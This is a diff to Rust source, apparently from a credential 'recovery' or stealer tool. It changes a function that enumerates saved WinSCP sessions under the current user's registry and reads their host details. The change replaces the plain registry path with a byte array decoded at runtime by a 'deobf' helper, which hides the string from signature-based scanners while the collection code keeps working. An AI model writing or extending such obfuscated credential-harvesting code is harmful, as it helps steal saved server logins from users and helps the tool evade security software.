@@ -1,3 +1,4 @@
+use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::{
     context::RecoveryContext,
     fs::sanitize_label,
@@ -208,10 +209,15 @@ struct WinSCPSession {
 }
 
 fn collect_winscp_sessions() -> Vec<WinSCPSession> {
-    const REGISTRY_PATH: &str = r"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions";
+    // "SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions"
+    let winscp_reg_path = deobf(&[
+        0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x81, 0xAF, 0x91, 0xD7, 0xD4, 0xCF,
+        0xE1, 0x9D, 0x91, 0xD4, 0xDA, 0xDB, 0xC4, 0xD1, 0xE1, 0x94, 0xD4, 0xCF, 0x90, 0x80, 0x9D,
+        0x93, 0xB1, 0xE1, 0x90, 0x86, 0x90, 0x90, 0xD4, 0xAC, 0xCE, 0xCF,
+    ]);
     let mut sessions = Vec::new();
 
-    if let Ok(root) = RegKey::predef(HKEY_CURRENT_USER).open_subkey(REGISTRY_PATH) {
+    if let Ok(root) = RegKey::predef(HKEY_CURRENT_USER).open_subkey(winscp_reg_path) {
         for sub in root.enum_keys().filter_map(Result::ok) {
             if let Ok(session_key) = root.open_subkey(&sub) {
                 let hostname = session_key.get_value::<String, _>("HostName").ok();
